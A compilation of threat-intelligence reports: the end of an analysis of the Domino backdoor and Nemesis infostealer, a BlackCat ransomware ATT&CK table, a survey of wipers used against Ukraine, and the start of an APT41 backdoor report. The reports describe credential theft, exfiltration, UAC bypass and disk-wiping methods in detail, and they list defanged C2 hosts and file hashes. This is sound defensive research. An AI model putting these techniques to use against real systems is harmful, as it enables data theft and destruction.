If the value of the load field is -1 then the loader allocates memory within the current process and then loads the PE payload into it using the full PE loading procedure.
It copies the headers, maps the individual PE sections, processes any relocations, loads the PE’s imports, and then executes the PE from its internally specified entry point. 
Finally, if the load field is equal to zero or another negative number, the payload is loaded as a .NET assembly. 
Nemesis Project Infostealer The final payload loaded by Domino Loader is a .NET assembly with MD5 hash D9FFB202D6B679E5AD7303C0334CD000 and identified as a ‘Project Nemesis’ infostealer.
Project Nemesis is a commodity malware written in .NET which was first advertised for sale on the dark web in December 2021, though it does not seem to be widely known and it is not frequently observed in the wild. 
The sample was initially advertised with the following text: !
The Steeler was originally developed for personal purposes, in the future for sale. !
Will be sold in one hand.
Price $ 1300 (bargaining is appropriate) !
STRICTLY THROUGH THE GUARANTOR DESCRIPTION : – Stealer is based on .Net[C#] – 4.5 .
The code is written from scratch, neat and clear, there are comments everywhere. 
– Selling together with all sources (build, builder, panel) FUNCTIONALITY : Spoiler: STEALER – Log collection takes place in memory – Collection of data from Chromium browsers (Cookies/CC/Passwords/Autofills/Bookmars/History) v80+ – Collection of data from Gecko browsers (Cookies/Passwords/Bookmark/History) v80+ – Collection of RDP/FTP sessions – Grabbink files from the desktop (by extension) – Collection of UserAgent – Collection of information about the system in HTML format – Collect Vpn (NordVpn/OpenVpn/ProtonVpn) –
Collecting Steam – Collection of the Telegram session (including the Portable version) – Collecting Discord tokens List of crypto wallets: 
Electrum,Electrum-Dash,Ethereum,Exodus,Atomic,Jaxx,Coinomi,Guarda,Armory,Zcash,Bytecoin List of supported crypto plugins: TronLink, MetaMask, Binance Chain Wallet Anti-sniffer: All programs that catch http/https data transfer are closed [even if the name is changed] – Self-delete after sending data (on/off) – CIS(Lock start in CIS countries) (on/off) – Blocking startup on virtual machines (on/off) – Sending data to the Web-panel (IP logger is on the side of the panel) 
Scroll to view full table Data collected by Nemesis can be accessed by the operator via a web-based control panel. 
Fig 4 — Nemesis Control Panel Login Screen Fig 5 — Nemesis Dashboard Static Analysis Upon execution Nemesis starts by creating a mutex to ensure only one instance of the malware is running: Local\\751E355F-B066-4547-B13E-B185D9176390 The malware keeps a log of its activity, mostly written in the Russian language, and the following is written upon its startup: Logger.
Write(“~[NEMESIS INIZIALIZE]~”); Logger.
Write(“Запуск задачи EngineTask”); Scroll to view full table Fig 6 — Nemesis Start-up Code Nemesis then immediately proceeds with infostealing activities, and collects the following data in order: Chromium-based browsers: Steals stored credentials, cookies, credit cards, bookmarks, autofill data, and history. 
Browsers include: “\\Chromium\\User Data\\”, “\\Google\\Chrome\\User Data\\”, “\\Google(x86)\\Chrome\\User Data\\”, “\\Opera Software\\”, “\\MapleStudio\\ChromePlus\\User Data\\”, “\\Iridium\\User Data\\”, “\\7Star\\7Star\\User Data\\”, “\\CentBrowser\\User Data\\”, “\\Chedot\\User Data\\”, “\\Vivaldi\\User Data\\”, “\\Kometa\\User Data\\”, “\\Elements Browser\\User Data\\”, “\\Epic Privacy Browser\\User Data\\”, “\\Microsoft\\Edge\\User Data\\”, “\\uCozMedia\\Uran\\User Data\\”, “\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\”, “\\CatalinaGroup\\Citrio\\User Data\\”, “\\Coowon\\Coowon\\User Data\\”, “\\liebao\\User Data\\”, “\\QIP Surf\\User Data\\”, “\\Orbitum\\User Data\\”, “\\Comodo\\Dragon\\User Data\\”, “\\Amigo\\User\\User Data\\”, “\\Torch\\User Data\\”, “\\Yandex\\YandexBrowser\\User Data\\”, “\\Comodo\\User Data\\”, “\\360Browser\\Browser\\User Data\\”, “\\Maxthon3\\User Data\\”, “\\K-Melon\\User Data\\”, “\\Sputnik\\Sputnik\\User Data\\”, “\\Nichrome\\User Data\\”, “\\CocCoc\\Browser\\User Data\\”, “\\Uran\\User Data\\”, “\\Chromodo\\User Data\\”, “\\Mail.Ru\\Atom\\User
Data\\”, “\\BraveSoftware\\Brave-Browser\\User Data\\” Gecko-based browsers: Steals stored credentials, cookies, bookmarks, and history. 
Browsers include: “\\Mozilla\\Firefox”, “\\Comodo\\IceDragon”, “\\Mozilla\\SeaMonkey”, “\\Moonchild Productions\\Pale Moon”, “\\Waterfox”, “\\K-Meleon”, “\\Thunderbird”, “\\8pecxstudios\\Cyberfox”, “\\NETGATE Technologies\\BlackHaw” CryptoWallet data from browser extensions MetaMask, TronLink, and Binance Clipboard data The following data collection tasks are then all set to run in parallel. CryptoWallets on disk from apps including: Electrum, Electrum-Dash, Ethereum, Exodus, Atomic, Jaxx, Coinomi, Guarda, Armory, Zcash, Bytecoin System info, including both hardware and OS info. 
Enumerates running processes Enumerates IDs from Steam application Enumerates files under Steam application directory Gets a list of installed browsers by looping through entries under registry key SOFTWARE\\Clients\\StartMenuInternet and SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet, and then recording the contents of subkey shell\\open\\command for each. 
Enumerate files on desktop Discord Tokens FoxMail data DynDNS credentials FileZilla connection credentials + hosts. 
NordVPN credentials OpenVPN files KerioVPN files Proton VPN credentials User-agents Pidgin credentials Telegram data files Telegram portable files RDP connection files (.rdp) 
The malware then collates all the data and adds it to a Zip archive which it then transfers back to the C2. 
Fig 7 — Nemesis waits for data collection tasks to complete, then adds the data to a zip archive to be sent to the C2 Fig 8 — Nemesis uploads data to the C2 via a HTTP POST request The C2 address for the analysed sample is https[:]//es-megadom[.]com Fig 9 — Nemesis Configuration A Tangled Web Provides Opportunities This analysis highlights the intricate relationships between cybercriminal groups and their members.
Domino Backdoor shares code overlap with the Lizar (aka Tirion, Diceloader) family of malware, developed by ITG14.
Since late February 2023, former members of ITG23 have been observed using Dave Loader with Domino Backdoor during their campaigns, suggesting at least some level of collaboration between the two groups.
The use of malware with ties to multiple groups in a single campaign — such as Dave Loader, Domino Backdoor and Project Nemesis Infostealer — highlights the complexity involved in tracking threat actors but also provides insight into how and with whom they operate. 
Indicators of Compromise Indicator Indicator Type Context de9b3c01991e357a349083f0db6af3e782f15e981e2bf0a16ba618252585923a SHA256 Hash Dave Loader / Domino Backdoor b14ab379ff43c7382c1aa881b2be39275c1594954746ef58f6a9a3535e8dc1a8 SHA256 Hash Dave Loader / Domino Backdoor dbdfc3ca5afa186c1a9a9c03129773f7bc17fb7988fe0ca40fc3c5bedb201978 SHA256 Hash Dave Loader /Domino
Backdoor ce99b4c0d75811ce70610d39b1007f99560e6dea887a451e08916a4f8cf33678 SHA256 Hash Dave Loader /Domino
Backdoor f1817665ea2831f775e23cbda27cbeb06d03e6c39bbfad920b50f40712dd37cb SHA256 Hash NewWorldOrder Loader / Carbanak Backdoor 51e0512a54640be8e3477363c8d72d893c6edd20399bddf71e95eec3ddfdb42e SHA256 Hash NewWorldOrder Loader / Carbanak Backdoor f4ebd59fb578a0184abf6870fc652210d63e078a35dace0a48c5f273e417c13d SHA256 Hash NewWorldOrder Loader / Domino Backdoor 92651f9418625e5281b84cccb817e94e6294b36c949b00fcd4046770b87f10e4 SHA256 Hash NewWorldOrder Loader / Domino Backdoor e5af0b9f4650dc0193c9884507e6202b04bb87ac5ed261be3f4ecfa3b6911af8 SHA256 Hash Domino Backdoor hxxp://170.130.55[.]250/x64.exe URL Staging URL for Domino Backdoor hxxps://upperdunk[.]com/mr64.exe URL Staging URL for Domino Backdoor 88.119.175[.]124 IP Address Domino Backdoor C2 94.158.247[.]72 IP Address Domino Backdoor C2 178.23.190[.]73 IP Address Carbanak C2 es-megadom[.]com Domain Project Nemesis C2 185.225.17[.]202 IP Address Domino Backdoor C2 5.182.37[.]118 IP Address Domino Backdoor C2 45.67.34[.]236 IP Address Project Nemesis C2 Scroll to view full table To learn how IBM X-Force can help you with anything regarding cybersecurity including incident response, threat intelligence, or offensive security services schedule a meeting here: IBM X-Force Scheduler If you are experiencing cybersecurity issues or an incident, contact X-Force to help: US hotline 1-888-241-9812 Global hotline (+001) 312-212-8034. 
The post Ex-Conti and FIN7 Actors Collaborate with New Domino Backdoor appeared first on Security Intelligence. 
title: Fat Cats url: https://blog.group-ib.com/blackcat Tactic;Technique;Description TA0001 Initial Access;T1190 Exploit Public-Facing Application;In a number of attacks, the threat actors used ProxyShell vulnerablilities (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207). ;T1133 External Remote Services;As an initial attack vector, insecure RDP and VPNs may be used. ;T1078 Valid Accounts;BlackCat affiliates may purchase access to their victim’s network infrastructure on underground forums. 
TA0002 Execution;T1106 Native API;BlackCat ransomware uses Native API. ;
T1053 Scheduled Task/Job;When deploying ransomware in the victim’s network infrastructure, BlackCat affiliates may exploit group policies, which results in a scheduled task being created (on each host) that launches the ransomware. ;T1059.001 Command and Scripting Interpreter:
PowerShell;The attackers may use PowerShell scripts when deploying ransomware in the victim’s network, disabling security tools, and encrypting files. ;T1059.003
Command and Scripting Interpreter:
Windows Command Shell;For stopping IIS, deleting Volume Shadow Copies, disabling recovery, clearing Windows event logs, etc., the BlackCat ransomware uses the command shell to run appropriate commands. 
;T1047 Windows Management
Instrumentation;The attackers may use wmic to obtain information and run various commands, including to delete Volume Shadow Copies.
They may also use the wmiexec module from Impacket to execute commands and move across the network. ;T1569.002 System Services: Service Execution;The BlackCat ranswomare for Windows can self-propagate in the local area network using the legitimate PsExec utility (contained in its body), which creates a temporary system service. 
TA0003 Persistence;T1505 Server Software Component;Successfully exploiting ProxyShell vulnerabilities enabled the attackers to place a web shell on a vulnerable Microsoft Exchange server. ;T1078 Valid Accounts;Legitimate accounts obtained by the attackers can be used to ensure persistence in the compromised infrastructure. 
TA0004 Privilege Escalation;T1078 Valid Accounts;To escalate privileges, BlackCat may use stolen legitimate accounts specified in the configuration data. ;T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control;To bypass UAC, BlackCat ransomware may escalate privileges using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method. ;T1134.002 Access Token Manipulation: Create Process with Token;To escalate privileges, the BlackCat ransomware can launch its process using stolen authentication data and the function CreateProcessWithLogonW. TA0005 Defense Evasion;T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control;The attackers may bypass UAC using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method. ;T1140 Deobfuscate/Decode Files or Information;BlackCat decrypts configuration data as well as decrypts and unpacks the legitimate PsExec utility and an additional BAT file contained in the body of the ransomware. ;T1027 Obfuscated Files or Information;BlackCat ransomware uses obfuscation. 
;T1562.001 Impair Defenses: Disable or Modify Tools;To prevent being detected, the attackers end processes and services related to security and antivirus software. ;T1497 Virtualization/Sandbox Evasion;To counter analysis (including in a sandbox), ALPHV MORPH checks the value of the command line parameter access-token.
Its value must contain correct first 16 characters used to decrypt BlackCat configuration data. 
;T1070.001 Indicator Removal on Host: Clear Windows Event Logs;By using wevtutil, BlackCat can clear all Windows event logs on a compromised host. ;
T1036 Masquerading;The attackers use a SoftPerfect Network Scanner executable renamed to svchost.exe. ;T1112 Modify Registry;To propagate, BlackCat uses PsExec to modify the system registry parameter MaxMpxCt to increase the number of failed network requests for each client. 
TA0006 Credential Access;T1003.001 OS Credential Dumping: LSASS Memory;To obtain authentication data, the attackers may dump the LSASS process using legitimate tools (procdump, comsvcs.dll). 
;T1552 Unsecured Credentials;To obtain authentication data from the registry and files, the attackers may use NirSoft utilities. 
;T1555 Credentials from Password Stores;To extract authentication data from web browsers and other storage spaces the attackers may use NirSoft utilities. 
TA0007 Discovery;T1018
Remote System Discovery;To enumerate domain hosts, the attackers used the ADRecon tool. ;T1069.002 Permission Groups Discovery: Local Groups;To obtain information about local and domain user groups, the attackers used the ADRecon tool. ;T1069.002 Permission Groups Discovery: Local Groups; ;T1069.002 Permission Groups Discovery: Domain Groups; ;T1087.001 Account Discovery: Local Account;To obtain information about local and domain accounts, the attackers used the ADRecon tool. 
;T1087.002 Account Discovery: Domain Account; ;T1482 Domain Trust Discovery;To obtain information about domain trust, the attackers used the ADRecon tool. ;T1046 Network Service Scanning;To scan the target network, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1135 Network Share Discovery;To search for network shares, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1016 System Network Configuration Discovery;For network reconnaissance, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1082 System Information Discovery;BlackCat uses wmic to obtain the UUID of the compromised host. 
;T1057 Process Discovery;BlackMatter enumerates all running processes to search for ones relating to security, backups, databases, email systems, office programs, etc. ;T1007 System Service Discovery;BlackCat enumerates system services to search for ones relating to security, backups, and databases. ;T1083 File and Directory Discovery;The attackers enumerate drives, directories, and files to search for sensitive information for exfiltration purposes. 
TA0008 Lateral Movement;T1021.001 Remote Services:
Remote Desktop Protocol;The attackers may use RDP to move across the network. ;T1021.002 Remote Services: SMB/Windows Admin Shares;After obtaining privileged authentication data, in order to spread over the local area network and access network resources, the attackers may use the PsExec utility, as well as the psexec, wmiexec and smbexec modules from Impacket. ;T1021.004 Remote Services: SSH;To access parts of the infrastructure running on Linux, the attackers use the PuTTY utility. ;T1570 Lateral Tool Transfer;Moving across the victim’s network and deploying ransomware involves copying related tools to the host.
The BlackCat ransomware can self-propagate in the network by using the legitimate PsExec utility contained in its body. 
TA0009 Collection;T1560.001 Archive Collected Data: Archive via Utility;Before being exfiltrated, data may be put in archives using 7-Zip. ;T1005 Data from Local System;The attackers collect information from the local system for exfiltration purposes. ;T1039
Data from Network Shared Drive;The attackers collect information from available network resources for exfiltration purposes. ;T1074 Data Staged;Before exfiltration, the attackers may put collected data in 7Zip archives. ;T1119 Automated collection;The attackers use ExMatter, a tool for automated collection of sensitive information. 
TA0011 Command and Control;T1071 Application Layer Protocol;Remote access tools used by the attackers may use application layer protocols (HTTP, HTTPS, DNS). ;T1105
Ingress Tool Transfer;After gaining initial access, the attackers copy tools necessary for deployment to the compromised host. ;
T1572
Protocol Tunneling;To access the compromised system, the attackers may use tunnels built using ngrok or gost. ;T1573 Encrypted Channel;To remotely access the compromised infrastructure, the attackers may use Cobalt Strike, TeamViewer and ScreenConnect, which perform asymmetric/symmetric encryption of the C&C server communication channel. ;
T1219
Remote Access Software;To remotely access the compromised infrastructure, the attackers may use the legitimate tools TeamViewer and ScreenConnect. 
TA0010 Exfiltration;T1041 Exfiltration
Over C2 Channel;When the attackers use Cobalt Strike, the collected information may be sent via Cobalt Strike server communication channels. ;T1048.002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol;The attackers may use the ExMatter exfiltration tool, which sends stolen data to SFTP and WebDav resources specified in the ExMatter configuration. ;T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage;The attackers use the Rclone synchronization utility to upload stolen data to the legitimate cloud storage service MEGA. ;T1020 Automated Exfiltration;After access has been gained, files from target hosts are automatically uploaded to the legitimate cloud storage service MEGA using the Rclone utility. 
;T1030 Data Transfer Size Limits;To prevent exceeding the size limits of the data being sent and triggering security controls, the stolen data may be sent in fixed-size blocks. 
TA0040 Impact;T1486Data
Encrypted for Impact ;BlackCat encrypts the contents of files in the local system as well as on available network resources. ;T1489 Service Stop;BlackCat stops security, backup, database, email and other services specified in the configuration. ;T1490 Inhibit System Recovery;BlackCat deletes Windows Volume Shadow Copies using vssadmin and wmic, disables recovery in the Windows boot menu using bccedit, and empties Recycle Bin.
BlackCat can stop backup services.
BlackCat can destroy virtual machine snapshots. 
;T1485Data Destruction ;If credentials for accessing a chat with the victim are leaked, BlackCat affiliates may delete encryption keys, which will render decrypting the files impossible. ;T1498 Network Denial of Service ;If the victim refuses to pay a ransom, BlackCat may carry out DDoS attacks against the victim’s infrastructure. 
title: Analysis on recent wiper attacks: examples and how wiper malware works url: https://cybersecurity.att.com/blogs/labs-research/analysis-on-recent-wiper-attacks-examples-and-how-they-wiper-malware-works Executive summary 2022 has experienced an increase in the number of wiper variants targeting Ukrainian entities. 
This blog post looks to explain how wipers work, what makes them so effective and provides a short overview of the most recent samples that appeared in the eastern Europe geopolitical conflict. 
How does wiper malware work? 
Wiper’s main objective is to destroy data from any storage device and make the information unavailable (T1485).
There are two ways of removing files, logical and physical. 
Logical file removal is the most common way of erasing a file, performed by users daily when a file is sent to (and emptied from) the Recycle bin, or when it is removed with the command line or terminal with the commands del/rm.
This action deletes the pointer to the file but not the file data, making it recoverable with forensic tools as long as the Operative System does not write any other file in the same physical location. 
However, malware wipers aim to make the data irrecoverable, so they tend to remove the data from the physical level of the disk.
The most effective way to remove the data/file is by overwriting the specific physical location with other data (usually a repeated byte like 0xFF).
This process usually involves writing to disk several Gigabytes (or Terabytes) of data and can be time consuming.
For this reason, in addition to destroying the data, many wipers first destroy two special files in the system: The Master Boot Record (MBR), which is used during the boot process to identify where the Operative System is stored in the disk.
By replacing the MBR, the boot process crashes, making the files inaccessible unless forensic methodologies are used. 
The Master File Table (MFT) is exclusive to NTFS file systems, contains the physical location of files in the drive as well as logical and physical size and any associated metadata.
If big files need to be stored in the drive, and cannot use consecutive blocks, these files will have to be fragmented in the disk.
The MFT holds the information of where each fragment is stored.
Removing the MFT will require the use of forensic tools to recover small files, and basically prevents recovery of fragmented files since the link between fragments is lost. 
The main difference between wipers and ransomware is that it’s impossible to retrieve the impacted information after a wiper attack.
Attackers using wipers do not usually target financial reward but intend to disrupt the victim’s operations as much as possible.
Ransomware operators aim to get a payment in exchange for the key to decrypt the user’s data. 
With both wiper and ransomware attacks, the victim depends on their back up system to recover after an attack.
However, even some wiper attacks carry ransom notes requesting a payment to recover the data.
It is important that the victim properly identifies the attack they've suffered, or they may pay the ransom without any chance of retrieving the lost data. 
In the last month and a half, since the war started in Eastern Europe, several wipers have been used in parallel with DDoS attacks (T1499) to keep financial institutions and government organizations, mainly Ukrainian, inaccessible for extended periods of time.
Some of the wipers observed in this timeframe have been: WhisperKill, HermeticWiper, IsaacWiper, CaddyWiper, DoubleZero Wiper and AcidRain. 
Most recent wiper examples WhisperKill On January 14, 2022, the Ukrainian government experienced a coordinated attack on 22 of their government agencies, defacing their websites.
Almost all the compromised websites were developed by the same Ukranian IT company, Kitsoft, and all of them were built on OctoberCMS.
Therefore, the attack vector was most probably a supply chain attack on the IT provider, or an exploitation of an OctoberCMS vulnerability, combined with exploitations of Log4Shell vulnerability (T1190). 
Figure 1.
Example of defaced Ukrainian government website. 
In addition to the website defacement, Microsoft Threat Intelligence Center (MSTIC), identified in a report destructive malware samples targeting Ukrainian organizations with two malware samples.
Microsoft named the samples WhisperGate, while other security companies labeled the downloader as WhisperGate and WhisperKill as the actual wiper, which was considered a component of WhisperGate. 
The identified files were: Stage1 replaces the Master Boot Record (MBR) with a ransom note when the system is powered down, deeming the machine unbootable after that point.
When booted up, the system displays Figure 2 on screen.
Despite the ransom request, the data will not be recoverable since all efforts made by WhisperKill are looking to destroy data, not encrypt it.
In this case, the wallet is most probably an attempt to decoy attribution efforts. 
Figure 2.
Ransom note obtained by MSTIC. 
Stage 2 attempts to download the next stage malware (T1102.003) from the Discord app, if unsuccessful, it sleeps and tries again.
The payload downloaded from the messaging app destroys as much data as possible by overwriting certain file types with 0xCC for the first MB of the file.
Then it modifies the file extension to a random four-byte extension.
By selecting the file types to be wiped and only writing over the first MB of data, the attackers are optimizing the wiping process.
This is due to not wasting time on system files and only spending the necessary time to wipe each file, rapidly switching to the next file as soon as the current one is unrecoverable.
Finally, the malware executes a command to delete itself from the system (T1070.004). 
HermeticWiper A month after, on February 23rd 2022, ESET Research reported a new Wiper being used against hundreds of Ukrainian systems.
The wiper receives its name from the stolen certificate (T1588.003) it was using to bypass security controls “Hermetica Digital Ltd” (T1588.003).
According to a Reuters article, the certificate could have also been obtained by impersonating the company and requesting a certificate from scratch. 
Figure 3.
Hermetica Digital Ltd certificate. 
The attackers have been seen using several methods to distribute the wiper through the domain, like: domain Group Policy Object (GPO) (T1484.001), Impacket or SMB (T1021.002) and WMI (T1047) with an additional worm component named HermeticWizard. 
The wiper component first installs the payload as a service (T1569.002) under C:\Windows\system32\Drivers\. Afterwards, the service corrupts the first 512 bytes of the MBR of all the Physical Drives, and then enumerates their partitions.
Before attempting to overwrite as much data as the wiper can it will delete key files in the partition, like MFT, $Bitmap, $LogFile, the NTUSER registry hive (T1112) and the event logs (T1070.001). 
On top of deleting key file system structures, it also performs a drive fragmentation (breaking up files and segregating them in the drive to optimize the system’s performance).
The combination of the file fragmentation and the deletion of the MFT makes file recovery difficult, since files will be scattered through the drive in small parts - without any guidance as to where each part is located. 
Finally, the malware writes randomized contents into all occupied sectors in the partition in an attempt to remove all potential hope of recovering any data with forensic tools or procedures. 
IsaacWiper A day after the initial destructive attack with HermeticWiper, on February 24th, 2022, a new wiper was used against the Ukrainian government, as reported by ESET, without any significant similarities to the HermaticWiper used the day before. 
IsaacWiper identifies all the physical drives not containing the Operative System and locks their logical partitions by only allowing a single thread to access each of them.
Then it starts to write random data into the drives in chunks of 64 KB.
There is a unique thread per volume, making the wiping process very long. 
Once the rest of the physical drives and the logical partitions sharing physical drive with the Operative System’s volume have been wiped, this last volume is wiped by: Erasing the MBR. 
Overwriting all files with 64 KB chunks of random data with one thread. 
Creating a new file under the C drive which will be filled with random data until it takes the maximum space it can from the partition, overwriting the already overwritten existing files.
This process is performed with a different thread, but it would still take a long time to write the full partition since both concurrent threads are actually attempting to write random data on the full disk. Figure 4.
IsaacWiper strings. 
When comparing IsaacWiper to WhisperKill, the attackers’ priorities become clear.
WhisperKill creators prioritized speed and number of affected files over ensuring the full drive is overwritten, since only 1 MB of each file was overwritten.
On the other hand, IsaacWiper creators gave total priority to deliver the most effective wiper, no matter how long it takes to overwrite the full physical disk. 
AcidRain On the same day IsaacWiper was deployed, another wiper attacked Viasat KA-SAT modems in Ukraine, this time with a different wiper, named AcidRain by SentinelLABS.
This wiper was particularly aimed at modems, probably to disrupt Internet access from Ukraine.
This new wiper showed similarities to previously seen botnets targeting modems using VPNFilter.
It was used in 2018, targeting vulnerabilities in several common router brands:
Linksys, MikroTik, NETGEAR, and TP-Link.
Exploiting vulnerabilities allowed the attackers to obtain Initial Access inside all types of networks, where the bot would search for Modbus traffic to identify infected systems with Industrial Control Systems (ICS). 
The wiper used was the ELF MIPS wiper targeting Viasat KA-SAT modems, which aimed to firstly overwrite any file outside of the any common *nix installation: bin, boot, dev, lib, proc, sbin, sys, sur, etc. to then delete data from /dev/. CaddyWiper The first version of CaddyWiper was discovered by ESET researchers on 2022-03-14 when it was used against a Ukrainian bank.
This new wiper variant does not have any significant code similarities to previous wipers.
This sample specifically sets an exclusion to avoid infecting Domain Controllers in the infected system.
Afterwards, it targets C:/Users and any additional attached drive all the way to letter Z:/ and zeroes all the files present in such folders/drives.
Finally, the extended information of the physical drives is destroyed, including the MBR and partition entries. 
A variant of CaddyWiper was used again on 2022-04-08 14:58 against high-voltage electrical substations in Ukraine.
This latest version of the wiper was delivered together with Industroyer2, an evolution of Industroyer, which has the main functionn being to communicate with industrial equipment.
In this case, the wiper was used with the purpose of slowing down the recovery process from the Industroyer2 attack and gaining back control of the ICS consoles, as well as covering the tracks of the attack.
According to Welivesecurity, who have been cooperating with CERT-UA in this investigation, the Sandworm Team is behind this latest attack. 
In this same attack against the energy station in Ukraine, other wiper samples for Linux and Solaris were observed by WeliveSecurity.
These wipers leverage the shred command if present, otherwise they use the basic dd or rm commands to wipe the system. 
DoubleZero wiper On March 22, 2022 CERT-UA reported a new wiper used against their infrastructure and enterprises.
Named DoubleZero, the wiper was distributed as a ZIP file containing an obfuscated .NET program.
The wiper’s routine sets a hardcoded list of system directories, which are skipped during an initial wiping targeting user files.
Afterwards, the skipped system directories are targeted and finally the registry hives: HKEY_LOCAL_MACHINE (containing the hives Sam, Security, Software and System), HKEY_CURRENT_USER and HKEY_USERS. 
There are two wiping methods, both of which zero out the selected file. 
Figure 5.
DoubleZero first wiping function. 
Conclusion As we have seen in the examples above, the main objective of the attackers behind wipers is to destroy all possible data and render systems unbootable (if possible), potentially requiring a full system restore if backups aren’t available.
These malware attacks can be as disruptive as ransomware attacks, but wipers are arguably worse since there is no potential escape door of a payment to recover the data. 
There are plenty of ways to wipe systems.
We've looked at 6 different wiper samples observed targeting Ukranian entities. 
These samples approach the attack in very different ways, and most of them occur faster than the time required to respond.
For that reason, it is not effective to employ detection of wiper malware, as once they are in the system as it is already too late.
The best approach against wipers is to prevent attacks by keeping systems up to date and by increasing cybersecurity awareness.
In addition, consequences can be ameliorated by having periodic backup copies of key infrastructure available. 
Associated indicators (IOCs) 
The following technical indicators are associated with the reported intelligence.
A list of indicators is also available in the following OTX Pulses: WhisperKill HermeticWiper and IsaacWiper AcidRain CaddyWiper DoubleZero Please note, the pulses may include other activities related but out of the scope of the report. 
TYPE INDICATOR DESCRIPTION SHA256 a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92 WhisperKill (stage1.exe) SHA256 dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78 WhisperKill (stage2.exe) SHA256 0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da HermeticWiper SHA256 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 HermeticWiper SHA256 13037b749aa4b1eda538fda26d6ac41c8f7b1d02d83f47b0d187dd645154e033 IsaacWiper SHA256 9b4dfaca873961174ba935fddaf696145afe7bbf5734509f95feb54f3584fd9a AcidRain SHA256 47f521bd6be19f823bfd3a72d851d6f3440a6c4cc3d940190bdc9b6dd53a83d6 AcidRain SHA256 Fc0e6f2effbfa287217b8930ab55b7a77bb86dbd923c0e8150551627138c9caa CaddyWiper SHA256 7062403bccacc7c0b84d27987b204777f6078319c3f4caa361581825c1a94e87 Industroyer2 SHA256 3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105355fe DoubleZero SHA256 30b3cbe8817ed75d8221059e4be35d5624bd6b5dc921d4991a7adc4c3eb5de4a DoubleZero Mapped to MITRE ATT&CK The findings of this report are mapped to the following MITRE ATT&CK Matrix techniques: TA0001: Initial Access T1190: Exploit Public-Facing Application TA0002
: Execution T1047: Windows Management Instrumentation T1569: System Services T1569.002:
Service Execution TA0008: Lateral Movement T1021:
Remote Services T1021.002: SMB/Windows Admin Shares TA0005: Defense Evasion T1070: Indicator Removal on Host T1070.004:
File Deletion T1070.001: Clear Windows Event Logs T1112: Modify Registry T1484: Domain Policy Modification T1484.001:
Group Policy Modification TA0011: Command and Control T1102: Web Service T1102.003: One-Way Communication TA0040: Impact T1485: Data Destruction T1499: Endpoint Denial of Service TA0042: Resource Development T1588: Obtain Capabilities T1588.003: Code Signing Certificates 
title: Higaisa or Winnti?
APT41 backdoors, old and new url: https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/ The PT Expert Security Center regularly spots emerging threats to information security, including both previously known and newly discovered malware.
During such monitoring in May 2020, we detected several samples of new malware that at first glance would seem to belong to the Higaisa group.
But detailed analysis pointed to the Winnti group (also known as APT41, per FireEye) of Chinese origin.
Subsequent monitoring led us to discover a number of new malware samples used by the group in recent attacks.
These include various droppers, loaders, and injectors; Crosswalk, ShadowPad, and PlugX backdoors; and samples of a previously undescribed backdoor that we have dubbed FunnySwitch.
We can confidently state that some of these attacks were directed at a number of organizations in Russia and Hong Kong. 
In this article, we will share the results of our investigation of these samples and related network infrastructure, as well as overlaps with previously described attacks. 
Contents Higaisa shortcuts Attribution Crosswalk Loaders and injectors Injectors Local shellcode loaders Attack examples An encrypted resume I can't breathe Chat transcript Attacks on Russian game developers Unity3D Game Developer from St. Petersburg HFS with a surprise A purloined certificate FunnySwitch Unpacking Funny.dll Transport protocols Network-level protocol Application-level protocol Supported commands Unused code FunnySwitch vs. Crosswalk ShadowPad PlugX Paranoid PlugX Conclusion PT products detection names PT Sandbox PT Network Attack Discovery Applications Known names of files from which PL shellcode may be loaded IOCs MITRE 1.
Higaisa shortcuts The first attack dates to May 12, 2020.
At the core of the attack is an archive named Project link and New copyright policy.rar (75cd8d24030a3160b1f49f1b46257f9d6639433214a10564d432b74cc8c4d020).
The archive contains a bait PDF document (Zeplin Copyright Policy.pdf) plus the folder All tort's projects - Web lnks with two shortcuts: Conversations - iOS - Swipe Icons - Zeplin.lnk Tokbox icon - Odds and Ends - iOS - Zeplin.lnk The structure of malicious shortcuts resembles the sample 20200308-sitrep-48-covid-19.pdf.lnk spread by the Higaisa group in March 2020. 
Figure 1.
Comparing command lines in the covid-19 and Zeplin shortcutsThe mechanism for initial infection is fundamentally the same: trying to open either of the shortcuts leads to running a command that extracts a Base64-encoded CAB archive from the body of the LNK file, after which the archive is unpacked to a temporary folder.
Further actions are performed with the help of an extracted JS script. 
Figure 2.
Contents of script 34fDFkfSD32.jsBut here is where the similarity with the sample described in our Higaisa report ends: instead, this script copies the payload to the folder C:\Users\Public\Downloads, achieves persistence by adding itself to the startup folder and adding a scheduler task, and runs the payload.
The script also sends the output of ipconfig in a POST request to http://zeplin.atwebpages[.]com/inter.php. 
The command run by the shortcut also contains the opening of a URL file extracted from the archive.
The name of the URL file and the target address depend on which shortcut is opened: Conversations - iOS - Swipe Icons - Zeplin.url goes to: https://app.zeplin.io/project/5b5741802f3131c3a63057a4/screen/5b589f697e44cee37e0e61df Tokbox icon - Odds and Ends - iOS - Zeplin.url goes to: https://app.zeplin.io/project/5c161c03fde4d550a251e20a/screen/5cef98986801a41be35122bb. 
This is the only difference between the two LNK files.
In both cases, the target page is hosted on Zeplin, a legitimate service for collaboration between designers and developers, and requires logging in to view. 
The payload consists of two files: svchast.exe It functions as a simple local shellcode loader.
The shellcode read from a fixed path.
Before starting, the loader checks the current year: 2018, 2019, 2020, or 2021. Figure 3.
Main function in svchast.exe 3t54dE3r.tmp The shellcode containing the main payload is the Crosswalk backdoor. 
